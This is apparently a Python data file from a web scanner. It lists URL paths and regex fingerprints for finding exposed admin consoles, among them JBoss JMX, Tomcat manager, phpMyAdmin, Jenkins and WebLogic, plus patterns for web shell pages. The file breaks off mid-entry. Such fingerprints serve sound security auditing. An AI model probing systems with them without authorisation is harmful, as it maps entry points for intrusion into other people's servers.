#!/usr/bin/env python
# -*- coding: utf-8 -*-


backend_admin_detect_test_cases = [

    {
        "case_id": 1010070072,
        "target": "<title>Shell\\sIn\\sA\\sBox</title>",
        "input": "?",
        "position": "BODY",
        "dir_depth":  "-1",
        "encode":  "NO",
    },

    {
        "case_id": 1010070025,
        "target": "(<title>JBoss\\s*JMX\\s*Management\\s*Console[^<]*<\\/title>[\\s\\S]*ObjectFilterView)",
        "input": "/jmx-console/",
        "position": "BODY",
        "dir_depth":  "0",
        "encode":  "NO",
    },

    {
        "case_id": 1010070026,
        "target": "(<title>Welcome\\s*to\\s*JBoss\\s*Application\\s*Server\\s*\\d<\\/title>[\\s\\S]*JBoss\\s*and\\s*JBoss\\s*Community)",
        "input": "/index.html",
        "position": "BODY",
        "dir_depth":  "0",
        "encode":  "NO",
    },

    {
        "case_id": 1010070027,
        "target": "(<title>Task\\s*Tracker\\s*Status<\\/title>(.*[\\r\\n])*.*Version:.*[\\d\\.]+)",
        "input": "/tasktracker.jsp",
        "position": "BODY",
        "dir_depth":  "3",
        "encode":  "NO",
    },

    {
        "case_id": 1010070028,
        "target": "(<title>Welcome\\sto\\sXAMPP[^<]*<\\/title>[\\s\\S]*XAMPP Control Panel)",
        "input": "/dashboard/",
        "position": "BODY",
        "dir_depth":  "0",
        "encode":  "NO",
    },

    {
        "case_id": 1010070029,
        "target": "(<span class=\"nh\">&nbsp;XAMPP.*[\\d\\.]+)",
        "input": "/xampp/navi.php",
        "position": "BODY",
        "dir_depth":  "0",
        "encode":  "NO",
    },

    {
        "case_id": 1010070030,
        "target": "(<title>XAMPP[\\s\\S]*<\\/title>[\\s\\S]*frameset\\s*cols=\"150,\\*\")",
        "input": "/xampp/",
        "position": "BODY",
        "dir_depth":  "0",
        "encode":  "NO",
    },

    {
        "case_id": 1010070031,
        "target": "(wiki_:resourceloader:filter:minify-css[\\s\\S]*mw-label[\\s\\S]*wpPassword1)",
        "input": "/index.php?title=%E7%89%B9%E6%AE%8A%3A%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95",
        "position": "BODY",
        "dir_depth":  "3",
        "encode":  "NO",
    },

    {
        "case_id": 1010070032,
        "target": "(wiki_:resourceloader:filter:minify-css[\\s\\S]*mw-log-user[\\s\\S]*mw-log-page)",
        "input": "/index.php?title=%E7%89%B9%E6%AE%8A%3A%E6%97%A5%E5%BF%97",
        "position": "BODY",
        "dir_depth":  "3",
        "encode":  "NO",
    },

    {
        "case_id": 1010070033,
        "target": "(dokuwiki__content[\\s\\S]*type=\"password\"\\s*name=\"p\")",
        "input": "/doku.php?do=admin",
        "position": "BODY",
        "dir_depth":  "3",
        "encode":  "NO",
    },

    {
        "case_id": 1010070034,
        "target": "(<title>OGNL\\s*Console[^<]*<\\/title>[\\s\\S]*Welcome to the OGNL console!)",
        "input": "/webconsole.html",
        "position": "BODY",
        "dir_depth":  "3",
        "encode":  "NO",
    },

    {
        "case_id": 1010070035,
        "target": "(<title>Openfire\\s*Admin\\s*Console[^<]*<\\/title>[\\s\\S]*jive-login-header)",
        "input": "/login.jsp",
        "position": "BODY",
        "dir_depth":  "3",
        "encode":  "NO",
    },

    {
        "case_id": 1010070036,
        "target": "(<title>srpc\\s*index<\\/title>[\\s\\S]*srpc)",
        "input": "/poppy",
        "position": "BODY",
        "dir_depth":  "3",
        "encode":  "NO",
    },

    {
        "case_id": 1010070037,
        "target": "(Zabbix[\\s\\S]*<\\!-- Login Form -->[\\s\\S]*Remember\\s*me)",
        "input": "/zabbix/",
        "position": "BODY",
        "dir_depth":  "3",
        "encode":  "NO",
    },

    {
        "case_id": 1010070038,
        "target": "(<title>jenkins[^<]*<\\/title>[\\s\\S]*<input[^\\/]*type\\s*=\\s*(\"|')password(\"|')[^\\/]*name\\s*=\\s*(\"|')j_password(\"|')[^\\/]*\\/?>)",
        "input": "/login",
        "position": "BODY",
        "dir_depth":  "3",
        "encode":  "NO",
    },

    {
        "case_id": 1010070039,
        "target": "(<title>Dashboard\\s*\\[Jenkins\\][^<]*<\\/title>[\\s\\S]*<a[^\\/]*href=\"http:\\/\\/jenkins-ci\\.org\">)",
        "input": "/jenkins/",
        "position": "BODY",
        "dir_depth":  "3",
        "encode":  "NO",
    },

    {
        "case_id": 1010070040,
        "target": "(<title>Dashboard\\s*\\[Jenkins\\][^<]*<\\/title>[\\s\\S]*<a[^\\/]*href=\"http:\\/\\/jenkins-ci\\.org\">)",
        "input": "/",
        "position": "BODY",
        "dir_depth":  "3",
        "encode":  "NO",
    },

    {
        "case_id": 1010070041,
        "target": "<title>webftp[^<]*<\\/title>[\\s\\S]*type=(\"|')password(\"|')",
        "input": "/webftp/login.php",
        "position": "BODY",
        "dir_depth":  "3",
        "encode":  "NO",
    },

    {
        "case_id": 1010070042,
        "target": "<title>WebLogic\\s*Server[^<]*<\\/title>",
        "input": "/console/login/LoginForm.jsp",
        "position": "BODY",
        "dir_depth":  "0",
        "encode":  "NO",
    },

    {
        "case_id": 1010070021,
        "target": "(<title>JBoss\\s*AS\\s*Admin\\s*Console<\\/title>[\\s\\S]*name=\"login_form:submit\")|(<title>JBoss\\s*Object\\s*Index<\\/title>[\\s\\S]*alt=\"JBoss\")",
        "input": "/jmx-console/",
        "position": "BODY",
        "dir_depth":  "0",
        "encode":  "NO",
    },

    {
        "case_id": 1010070023,
        "target": "(<title>JBoss\\s*AS\\s*Admin\\s*Console<\\/title>[\\s\\S]*name=\"login_form:submit\")|(<title>JBoss\\s*Object\\s*Index<\\/title>[\\s\\S]*alt=\"JBoss\")",
        "input": "/jmx-console/filterView.jsp",
        "position": "BODY",
        "dir_depth":  "0",
        "encode":  "NO",
    },

    {
        "case_id": 1010070022,
        "target": "(<title>JBoss\\s*AS\\s*Admin\\s*Console<\\/title>[\\s\\S]*name=\"login_form:submit\")|(<title>JBoss\\s*Object\\s*Index<\\/title>[\\s\\S]*alt=\"JBoss\")",
        "input": "/jmx-console/HtmlAdaptor",
        "position": "BODY",
        "dir_depth":  "0",
        "encode":  "NO",
    },

    {
        "case_id": 1010070019,
        "target": "(<title>JBoss\\s*Management\\s*Console[^<]*<\\/title>[\\s\\S]*alt=\"JBoss\")",
        "input": "/web-console/ServerInfo.jsp",
        "position": "BODY",
        "dir_depth":  "0",
        "encode":  "NO",
    },

    {
        "case_id": 1010070017,
        "target": "(content='noindex,follow'[\\s\\S]*class=\"forgetmenot\"[\\s\\S]*backtoblog)",
        "input": "/wp-admin/",
        "position": "BODY",
        "dir_depth":  "3",
        "encode":  "NO",
    },

    {
        "case_id": 1010070016,
        "target": "(content='noindex,follow'[\\s\\S]*class=\"forgetmenot\"[\\s\\S]*backtoblog)",
        "input": "/wp-login.php",
        "position": "BODY",
        "dir_depth":  "3",
        "encode":  "NO",
    },

    {
        "case_id": 1010070015,
        "target": "(<title>Apache\\s*Tomcat.*Documentation\\s*Index<\\/title>[\\s\\S]*<\\!--PROJECT\\s*LOGO-->)",
        "input": "/docs/",
        "position": "BODY",
        "dir_depth":  "0",
        "encode":  "NO",
    },

    {
        "case_id": 1010070014,
        "target": "(<title>Apache\\sTomcat[^>]*<\\/title>[\\s\\S]*\\$CATALINA_HOME)",
        "input": "/tomcat/",
        "position": "BODY",
        "dir_depth":  "0",
        "encode":  "NO",
    },

    {
        "case_id": 1010070012,
        "target": "(<title>Apache\\sTomcat[^>]*<\\/title>[\\s\\S]*\\$CATALINA_HOME)",
        "input": "/admin/login.jsp",
        "position": "BODY",
        "dir_depth":  "0",
        "encode":  "NO",
    },

    {
        "case_id": 1010070011,
        "target": "(Discuz\\!\\sAdministrator's\\sControl\\sPanel)",
        "input": "/admin",
        "position": "BODY",
        "dir_depth":  "3",
        "encode":  "NO",
    },

    {
        "case_id": 1010070010,
        "target": "(Discuz\\!\\sAdministrator's\\sControl\\sPanel)",
        "input": "/admin.php",
        "position": "BODY",
        "dir_depth":  "3",
        "encode":  "NO",
    },

    {
        "case_id": 1010070006,
        "target": "(<input\\stype=\"password\"\\sname=\"pma_password\")",
        "input": "/phpMyAdmin/index.php",
        "position": "BODY",
        "dir_depth":  "3",
        "encode":  "NO",
    },

    {
        "case_id": 1010070007,
        "target": "(<option\\svalue=\"pmahomme\"\\sselected=\"selected\">pmahomme)",
        "input": "/pma/main.php",
        "position": "BODY",
        "dir_depth":  "3",
        "encode":  "NO",
    },

    {
        "case_id": 1010070008,
        "target": "(Discuz\\!\\sAdministrator's\\sControl\\sPanel)",
        "input": "/admincp.php",
        "position": "BODY",
        "dir_depth":  "3",
        "encode":  "NO",
    },

    {
        "case_id": 1010070009,
        "target": "(Discuz\\!\\sAdministrator's\\sControl\\sPanel)",
        "input": "/ucadmin/admincp.php",
        "position": "BODY",
        "dir_depth":  "3",
        "encode":  "NO",
    },

    {
        "case_id": 1010070005,
        "target": "(<input\\stype=\"password\"\\sname=\"pma_password\")",
        "input": "/phpmyadmin/index.php",
        "position": "BODY",
        "dir_depth":  "3",
        "encode":  "NO",
    },

    {
        "case_id": 1010070004,
        "target": "(<title>(Resin Admin Login)|(Resin Administration)[^<]*<\\/title>)",
        "input": "/resin-admin/",
        "position": "BODY",
        "dir_depth":  "0",
        "encode":  "NO",
    },

    {
        "case_id": 1010070062,
        "target": "(^401[\\s\\S]*WWW-Authenticate)",
        "input": "?",
        "position": "HEAD",
        "dir_depth":  "-1",
        "encode":  "NO",
    },

    {
        "case_id": 1010070060,
        "target": "(^401[\\s\\S]*WWW-Authenticate)",
        "input": "/manager/html/",
        "position": "HEAD",
        "dir_depth":  "0",
        "encode":  "NO",
    },

    {
        "case_id": 1010070061,
        "target": "(^401[\\s\\S]*WWW-Authenticate)",
        "input": "/manager/status/",
        "position": "HEAD",
        "dir_depth":  "0",
        "encode":  "NO",
    },

    {
        "case_id": 1010070044,
        "target": "(<title>Apache\\sTomcat[^>]*<\\/title>[\\s\\S]*\\$CATALINA_HOME)|(content='noindex,follow'[\\s\\S]*class=\"forgetmenot\"[\\s\\S]*backtoblog)",
        "input": "/admin/",
        "position": "BODY",
        "dir_depth":  "3",
        "encode":  "NO",
    },

    {
        "case_id": 1010070043,
        "target": "(<title>JBoss\\s*JMX\\s*Management\\s*Console[^<]*<\\/title>[\\s\\S]*ObjectFilterView)|(<title>JBoss\\s*AS\\s*Admin\\s*Console<\\/title>[\\s\\S]*name=\"login_form:submit\")",
        "input": "/admin-console/",
        "position": "BODY",
        "dir_depth":  "0",
        "encode":  "NO",
    },

    {
        "case_id": 1010070045,
        "target": "<form\\smethod=(\"|')post(\"|')\\saction=(\"|')setup-config.php\\?step=2(\"|')>",
        "input": "/wordpress/wp-admin/setup-config.php",
        "position": "BODY",
        "dir_depth":  "0",
        "encode":  "NO",
    },

    {
        "case_id": 1010070047,
        "target": "(<(title|h1)>(Discuz\\!\\s|UCenter\\s)?Administrator's\\sControl\\sPanel)",
        "input": "/uc_server/",
        "position": "BODY",
        "dir_depth":  "0",
        "encode":  "NO",
    },

    {
        "case_id": 1010070048,
        "target": "(<(title|h1)>(Discuz\\!\\s|UCenter\\s)?Administrator's\\sControl\\sPanel)",
        "input": "/uc_server/admin.php?m=user&a=login&iframe=&sid=",
        "position": "BODY",
        "dir_depth":  "0",
        "encode":  "NO",
    },

    {
        "case_id": 1010070049,
        "target": "(<(title|h1)>(Discuz\\!\\s|UCenter\\s)?Administrator's\\sControl\\sPanel)",
        "input": "/uc_server/admin.php/?m=user&a=login&iframe=&sid=",
        "position": "BODY",
        "dir_depth":  "0",
        "encode":  "NO",
    },

    {
        "case_id": 1010070050,
        "target": "(background:url\\('/owa/auth/Content/images/bg\\.jpg)|(Outlook Web App)|(<form\\s+action=\"/owa/auth\\.owa\")",
        "input": "/owa/auth/logon.aspx",
        "position": "BODY",
        "dir_depth":  "0",
        "encode":  "NO",
    },

    {
        "case_id": 1010070076,
        "target": "(<title>[^</]*(管理|后台|运营(平台|系统)|administrator)[^</]*</title>)[\\s\\S]*<input[^<]*type\\s*=\\s*('|\")?password('|\")?",
        "input": "/admin.php",
        "position": "BODY",
        "dir_depth":  "2",
        "encode":  "NO",
    },

    {
        "case_id": 1010070077,
        "target": "(<title>[^</]*(管理|后台|运营(平台|系统)|administrator)[^</]*</title>)[\\s\\S]*<input[^<]*type\\s*=\\s*('|\")?password('|\")?",
        "input": "/admin/",
        "position": "BODY",
        "dir_depth":  "2",
        "encode":  "NO",
    },

    {
        "case_id": 1010070078,
        "target": "(<title>[^</]*(管理|后台|运营(平台|系统)|administrator)[^</]*</title>)[\\s\\S]*<input[^<]*type\\s*=\\s*('|\")?password('|\")?",
        "input": "/admin/login/",
        "position": "BODY",
        "dir_depth":  "2",
        "encode":  "NO",
    },

    {
        "case_id": 1010070079,
        "target": "(<title>[^</]*(管理|后台|运营(平台|系统)|administrator)[^</]*</title>)[\\s\\S]*<input[^<]*type\\s*=\\s*('|\")?password('|\")?",
        "input": "/admin/login.html",
        "position": "BODY",
        "dir_depth":  "2",
        "encode":  "NO",
    },

    {
        "case_id": 1010070080,
        "target": "(<title>[^</]*(管理|后台|运营(平台|系统)|administrator)[^</]*</title>)[\\s\\S]*<input[^<]*type\\s*=\\s*('|\")?password('|\")?",
        "input": "/admin/login.php",
        "position": "BODY",
        "dir_depth":  "2",
        "encode":  "NO",
    },

    {
        "case_id": 1010070081,
        "target": "(<title>[^</]*(管理|后台|运营(平台|系统)|administrator)[^</]*</title>)[\\s\\S]*<input[^<]*type\\s*=\\s*('|\")?password('|\")?",
        "input": "/admin/adminlogin.php",
        "position": "BODY",
        "dir_depth":  "2",
        "encode":  "NO",
    },

    {
        "case_id": 1010070067,
        "target": "(<title>.*(管理|后台|运营(平台|系统)|admin(istrator)?).*</title>[\\s\\S.]*(passport\\.oa\\.com/modules/passport/signin\\.ashx))",
        "input": "?",
        "position": "BODY",
        "dir_depth":  "-1",
        "encode":  "NO",
    },

    {
        "case_id": 1010070066,
        "target": "(<title>.*(管理|后台|运营(平台|系统)|admin(istrator)?).*</title>[\\s\\S.]*(passport\\.oa\\.com/modules/passport/signin\\.ashx))",
        "input": "/",
        "position": "BODY",
        "dir_depth":  "-1",
        "encode":  "NO",
    },

    {
        "case_id": 1010070082,
        "target": "(<title>[^</]*(管理|后台|运营(平台|系统)|administrator)[^</]*</title>)[\\s\\S]*<input[^<]*type\\s*=\\s*('|\")?password('|\")?",
        "input": "/administrator/",
        "position": "BODY",
        "dir_depth":  "2",
        "encode":  "NO",
    },

    {
        "case_id": 1010070083,
        "target": "(<title>[^</]*(管理|后台|运营(平台|系统)|administrator)[^</]*</title>)[\\s\\S]*<input[^<]*type\\s*=\\s*('|\")?password('|\")?",
        "input": "/adminlogin/",
        "position": "BODY",
        "dir_depth":  "2",
        "encode":  "NO",
    },

    {
        "case_id": 1010070084,
        "target": "(<title>[^</]*(管理|后台|运营(平台|系统)|administrator)[^</]*</title>)[\\s\\S]*<input[^<]*type\\s*=\\s*('|\")?password('|\")?",
        "input": "/adminlogin.php",
        "position": "BODY",
        "dir_depth":  "2",
        "encode":  "NO",
    },

    {
        "case_id": 1010070085,
        "target": "(<title>[^</]*(管理|后台|运营(平台|系统)|administrator)[^</]*</title>)[\\s\\S]*<input[^<]*type\\s*=\\s*('|\")?password('|\")?",
        "input": "/adminuser/",
        "position": "BODY",
        "dir_depth":  "2",
        "encode":  "NO",
    },

    {
        "case_id": 1010070086,
        "target": "(<title>[^</]*(管理|后台|运营(平台|系统)|administrator)[^</]*</title>)[\\s\\S]*<input[^<]*type\\s*=\\s*('|\")?password('|\")?",
        "input": "/adminuserlogin/",
        "position": "BODY",
        "dir_depth":  "2",
        "encode":  "NO",
    },

    {
        "case_id": 1010070087,
        "target": "(<title>[^</]*(管理|后台|运营(平台|系统)|administrator)[^</]*</title>)[\\s\\S]*<input[^<]*type\\s*=\\s*('|\")?password('|\")?",
        "input": "/adminuserlogin.php",
        "position": "BODY",
        "dir_depth":  "2",
        "encode":  "NO",
    },

    {
        "case_id": 1010070088,
        "target": "(<title>[^</]*(管理|后台|运营(平台|系统)|administrator)[^</]*</title>)[\\s\\S]*<input[^<]*type\\s*=\\s*('|\")?password('|\")?",
        "input": "/backend/",
        "position": "BODY",
        "dir_depth":  "2",
        "encode":  "NO",
    },

    {
        "case_id": 1010070089,
        "target": "(<title>[^</]*(管理|后台|运营(平台|系统)|administrator)[^</]*</title>)[\\s\\S]*<input[^<]*type\\s*=\\s*('|\")?password('|\")?",
        "input": "/console/",
        "position": "BODY",
        "dir_depth":  "2",
        "encode":  "NO",
    },

    {
        "case_id": 1010070090,
        "target": "(<title>[^</]*(管理|后台|运营(平台|系统)|administrator)[^</]*</title>)[\\s\\S]*<input[^<]*type\\s*=\\s*('|\")?password('|\")?",
        "input": "/dashboard/",
        "position": "BODY",
        "dir_depth":  "2",
        "encode":  "NO",
    },

    {
        "case_id": 1010070065,
        "target": "(<input[^/]*type\\s*=\\s*(\"|')?password(\"|')?[^/]*/?>[\\s\\S]*(passport\\.oa\\.com/modules/passport/signin\\.ashx))",
        "input": "?",
        "position": "BODY",
        "dir_depth":  "-1",
        "encode":  "NO",
    },

    {
        "case_id": 1010070063,
        "target": "(^401[\\s\\S]*WWW-Authenticate)",
        "input": "/",
        "position": "HEAD",
        "dir_depth":  "-1",
        "encode":  "NO",
    },

    {
        "case_id": 1010070064,
        "target": "(<input[^/]*type\\s*=\\s*(\"|')?password(\"|')?[^/]*/?>[\\s\\S]*(passport\\.oa\\.com/modules/passport/signin\\.ashx))",
        "input": "/",
        "position": "BODY",
        "dir_depth":  "-1",
        "encode":  "NO",
    },

    {
        "case_id": 1010070059,
        "target": "(^401[\\s\\S]*WWW-Authenticate)",
        "input": "/host-manager/html/",
        "position": "HEAD",
        "dir_depth":  "0",
        "encode":  "NO",
    },

    {
        "case_id": 1010070068,
        "target": "(((<input[^/]*type\\s*=\\s*(\"|')?password(\"|')?[^/]*/?>)|(<title>.*(管理|后台|运营(平台|系统)|admin(istrator)?).*</title>))[\\s\\S]*(href=('|\")(http:)?//[\\w_-]+\\.(oa|ied|boss|itil|soc|isd|wsd|webdev|addev|cf|cm|oss|server)\\.com))",
        "input": "?",
        "position": "BODY",
        "dir_depth":  "-1",
        "encode":  "NO",
    },

    {
        "case_id": 1010070069,
        "target": "(((<input[^/]*type\\s*=\\s*(\"|')?password(\"|')?[^/]*/?>)|(<title>.*(管理|后台|运营(平台|系统)|admin(istrator)?).*</title>))[\\s\\S]*(href=('|\")(http:)?//[\\w_-]+\\.(oa|ied|boss|itil|soc|isd|wsd|webdev|addev|cf|cm|oss|server)\\.com))",
        "input": "/",
        "position": "BODY",
        "dir_depth":  "-1",
        "encode":  "NO",
    },

    {
        "case_id": 1010070092,
        "target": "(<title>[^</]*(管理|后台|运营(平台|系统)|administrator)[^</]*</title>)[\\s\\S]*<input[^<]*type\\s*=\\s*('|\")?password('|\")?",
        "input": "/guanli/",
        "position": "BODY",
        "dir_depth":  "2",
        "encode":  "NO",
    },

    {
        "case_id": 1010070091,
        "target": "(<title>[^</]*(管理|后台|运营(平台|系统)|administrator)[^</]*</title>)[\\s\\S]*<input[^<]*type\\s*=\\s*('|\")?password('|\")?",
        "input": "/denglu/",
        "position": "BODY",
        "dir_depth":  "2",
        "encode":  "NO",
    },

    {
        "case_id": 1010070073,
        "target": "<title>[^<]*shell[^<]*</title>",
        "input": "?",
        "position": "BODY",
        "dir_depth":  "-1",
        "encode":  "NO",
    },

    {
        "case_id": 1010070074,
        "target": "<input\\s+name=\"password\"\\s+type=\"password\"\\s+class=\"ipt\"",
        "input": "/index.php?m=admin&c=index&a=login&pc_hash=",
        "position": "BODY",
        "dir_depth":  "2",
        "encode":  "NO",
    },

    {
        "case_id": 1010070075,
        "target": "<title>Cloudera\\s+Manager</title>[\\s\\S]*<input\\s+type=\"password\"\\s+class=\"input-large\"\\s+id=\"password\"\\s+name=\"j_password\"",
        "input": "/cmf/login",
        "position": "BODY",
        "dir_depth":  "0",
        "encode":  "NO",
    },

    {
        "case_id": 1010070093,
        "target": "(<title>[^</]*(管理|后台|运营(平台|系统)|administrator)[^</]*</title>)[\\s\\S]*<input[^<]*type\\s*=\\s*('|\")?password('|\")?",
        "input": "/houtai/",
        "position": "BODY",
        "dir_depth":  "2",
        "encode":  "NO",
    },

    {
        "case_id": 1010070094,
        "target": "(<title>[^</]*(管理|后台|运营(平台|系统)|administrator)[^</]*</title>)[\\s\\S]*<input[^<]*type\\s*=\\s*('|\")?password('|\")?",
        "input": "/logon/",
        "position": "BODY",
        "dir_depth":  "2",
        "encode":  "NO",
    },

    {
        "case_id": 1010070095,
        "target": "(<title>[^</]*(管理|后台|运营(平台|系统)|administrator)[^</]*</title>)[\\s\\S]*<input[^<]*type\\s*=\\s*('|\")?password('|\")?",
        "input": "/login/",
        "position": "BODY",
        "dir_depth":  "2",
        "encode":  "NO",
    },

    {
        "case_id": 1010070096,
        "target": "(<title>[^</]*(管理|后台|运营(平台|系统)|administrator)[^</]*</title>)[\\s\\S]*<input[^<]*type\\s*=\\s*('|\")?password('|\")?",
        "input": "/login.html",
        "position": "BODY",
        "dir_depth":  "2",
        "encode":  "NO",
    },

    {
        "case_id": 1010070097,
        "target": "(<title>[^</]*(管理|后台|运营(平台|系统)|administrator)[^</]*</title>)[\\s\\S]*<input[^<]*type\\s*=\\s*('|\")?password('|\")?",
        "input": "/login.jsp",
        "position": "BODY",
        "dir_depth":  "2",
        "encode":  "NO",
    },

    {
        "case_id": 1010070098,
        "target": "(<title>[^</]*(管理|后台|运营(平台|系统)|administrator)[^</]*</title>)[\\s\\S]*<input[^<]*type\\s*=\\s*('|\")?password('|\")?",
        "input": "/login.php",
        "position": "BODY",
        "dir_depth":  "2",
        "encode":  "NO",
    },

    {
        "case_id": 1010070099,
        "target": "(<title>[^</]*(管理|后台|运营(平台|系统)|administrator)[^</]*</title>)[\\s\\S]*<input[^<]*type\\s*=\\s*('|\")?password('|\")?",
        "input": "/loginpage.php",
        "position": "BODY",
        "dir_depth":  "2",
        "encode":  "NO",
    },

    {
        "case_id": 1010070100,
        "target": "(<title>[^</]*(管理|后台|运营(平台|系统)|administrator)[^</]*</title>)[\\s\\S]*<input[^<]*type\\s*=\\s*('|\")?password('|\")?",
        "input": "/manage/",
        "position": "BODY",
        "dir_depth":  "2",
        "encode":  "NO",
    },

    {
        "case_id": 1010070101,
        "target": "(<title>[^</]*(管理|后台|运营(平台|系统)|administrator)[^</]*</title>)[\\s\\S]*<input[^<]*type\\s*=\\s*('|\")?password('|\")?",
        "input": "/manage.php",
        "position": "BODY",
        "dir_depth":  "2",
        "encode":  "NO",
    },

    {
        "case_id": 1010070102,
        "target": "(<title>[^</]*(管理|后台|运营(平台|系统)|administrator)[^</]*</title>)[\\s\\S]*<input[^<]*type\\s*=\\s*('|\")?password('|\")?",
        "input": "/manager/",
        "position": "BODY",
        "dir_depth":  "2",
        "encode":  "NO",
    },

    {
        "case_id": 1010070103,
        "target": "(<title>[^</]*(管理|后台|运营(平台|系统)|administrator)[^</]*</title>)[\\s\\S]*<input[^<]*type\\s*=\\s*('|\")?password('|\")?",
        "input": "/manager.php",
        "position": "BODY",
        "dir_depth":  "2",
        "encode":  "NO",
    },

    {
        "case_id": 1010070104,
        "target": "(<title>[^</]*(管理|后台|运营(平台|系统)|administrator)[^</]*</title>)[\\s\\S]*<input[^<]*type\\s*=\\s*('|\")?password('|\")?",
        "input": "/managesystem/",
        "position": "BODY",
        "dir_depth":  "2",
        "encode":  "NO",
    },

    {
        "case_id": 1010070105,
        "target": "(<title>[^</]*(管理|后台|运营(平台|系统)|administrator)[^</]*</title>)[\\s\\S]*<input[^<]*type\\s*=\\s*('|\")?password('|\")?",
        "input": "/memberlogin.php",
        "position": "BODY",
        "dir_depth":  "2",
        "encode":  "NO",
    },

    {
        "case_id": 1010070106,
        "target": "(<title>[^</]*(管理|后台|运营(平台|系统)|administrator)[^</]*</title>)[\\s\\S]*<input[^<]*type\\s*=\\s*('|\")?password('|\")?",
        "input": "/sysadmin/",
        "position": "BODY",
        "dir_depth":  "2",
        "encode":  "NO",
    },

    {
        "case_id": 1010070107,
        "target": "(<title>[^</]*(管理|后台|运营(平台|系统)|administrator)[^</]*</title>)[\\s\\S]*<input[^<]*type\\s*=\\s*('|\")?password('|\")?",
        "input": "/sysadmin/",
        "position": "BODY",
        "dir_depth":  "2",
        "encode":  "NO",
    },

    {
        "case_id": 1010070108,
        "target": "(<title>[^</]*(管理|后台|运营(平台|系统)|administrator)[^</]*</title>)[\\s\\S]*<input[^<]*type\\s*=\\s*('|\")?password('|\")?",
        "input": "/",
        "position": "BODY",
        "dir_depth":  "-1",
        "encode":  "NO",
    },

    {
        "case_id": 1010070109,
        "target": "(<title>[^</]*(管理|后台|运营(平台|系统)|administrator)[^</]*</title>)[\\s\\S]*<input[^<]*type\\s*=\\s*('|\")?password('|\")?",
        "input": "?",
        "position": "BODY",
        "dir_depth":  "-1",
        "encode":  "NO",
    },

    {
        "case_id": 1010070110,
        "target": "(<title>[^</]*(管理|后台|运营(平台|系统)|administrator)[^</]*</title>)[\\s\\S]*(rtx联系|联系rtx)",
        "input": "/",
        "position": "BODY",
        "dir_depth":  "-1",
        "encode":  "NO",
    },

    {
        "case_id": 1010070111,
        "target": "(<title>[^</]*(管理|后台|运营(平台|系统)|administrator)[^</]*</title>)[\\s\\S]*(rtx联系|联系rtx)",
        "input": "?",
        "position": "BODY",
        "dir_depth":  "-1",
        "encode":  "NO",
    },

    {
        "case_id": 1010070112,
        "target": "(<title>JBoss\\s*JMX\\s*Management\\s*Console[^<]*</title>[\\s\\S]*ObjectFilterView)|(<title>JBoss\\s*AS\\s*Admin\\s*Console</title>[\\s\\S]*name=\"login_form:submit\")|(<title>JBoss\\s*Management\\s*Console[^<]*</title>[\\s\\S]*alt=\"JBoss\")|(<title>JBoss\\s*Object\\s*Index</title>[\\s\\S]*alt=\"JBoss\")|(<title>Welcome\\s*to\\s*JBoss\\s*Application\\s*Server\\s*\\d</title>[\\s\\S]*JBoss\\s*and\\s*JBoss\\s*Community)|(<title>XAMPP[\\s\\S]*</title>[\\s\\S]*frameset\\s*cols=\"150,\\*\")|(<title>Welcome\\sto\\sXAMPP[^<]*</title>[\\s\\S]*XAMPP Control Panel)|(<span class=\"nh\">&nbsp;XAMPP.*[\\d\\.]+)|(wiki_:resourceloader:filter:minify-css[\\s\\S]*mw-label[\\s\\S]*wpPassword1)|(<form\\smethod=(\"|')post(\"|')\\saction=(\"|')setup-config.php\\?step=2(\"|')>)|(wiki_:resourceloader:filter:minify-css[\\s\\S]*mw-log-user[\\s\\S]*mw-log-page)|(dokuwiki__content[\\s\\S]*type=\"password\"\\s*name=\"p\")|(<title>Openfire\\s*Admin\\s*Console[^<]*</title>[\\s\\S]*jive-login-header)|(<title>srpc\\s*index</title>[\\s\\S]*srpc)|(Zabbix[\\s\\S]*<\\!-- Login Form -->[\\s\\S]*Remember\\s*me)|(<title>jenkins[^<]*</title>[\\s\\S]*<input[^/]*type\\s*=\\s*(\"|')password(\"|')[^/]*name\\s*=\\s*(\"|')j_password(\"|')[^/]*/?>)|(<title>Dashboard\\s*\\[Jenkins\\][^<]*</title>[\\s\\S]*<a[^/]*href=\"http://jenkins-ci\\.org\">)|(<title>WebLogic\\s*Server[^<]*</title>)|(<title>webftp[^<]*</title>[\\s\\S]*type=(\"|')password(\"|'))|(<title>Task\\s*Tracker\\s*Status</title>(.*[\\r\\n])*.*Version:.*[\\d\\.]+)|(<(title|h1)>(Discuz\\!\\s|UCenter\\s)?Administrator's\\sControl\\sPanel)|(<title>(Resin Admin Login)|(Resin Administration)[^<]*</title>)|(<title>OGNL\\s*Console[^<]*</title>[\\s\\S]*Welcome to the OGNL console!)|(<option\\svalue=\"pmahomme\"\\sselected=\"selected\">pmahomme)|(<input\\stype=\"password\"\\sname=\"pma_password\")|(<title>Apache\\sTomcat[^>]*</title>[\\s\\S]*\\$CATALINA_HOME)|(content='noindex,follow'[\\s\\S]*class=\"forgetmenot\"[\\s\\S]*backtoblog)|(<title>Apache\\s*Tomcat.*Documentation\\s*Index</title>[\\s\\S]*<\\!--PROJECT\\s*LOGO-->)|(<title>Cloudera\\s+Manager</title>[\\s\\S]*<input\\s+type=\"password\"\\s+class=\"input-large\"\\s+id=\"password\"\\s+name=\"j_password\")|(<input\\s+name=\"password\"\\s+type=\"password\"\\s+class=\"ipt\")|(<title>Shell\\sIn\\sA\\sBox</title>)",
        "input": "?",
        "position": "BODY",
        "dir_depth":  "-1",
        "encode":  "NO",
    },

    {
        "case_id": 1010070113,
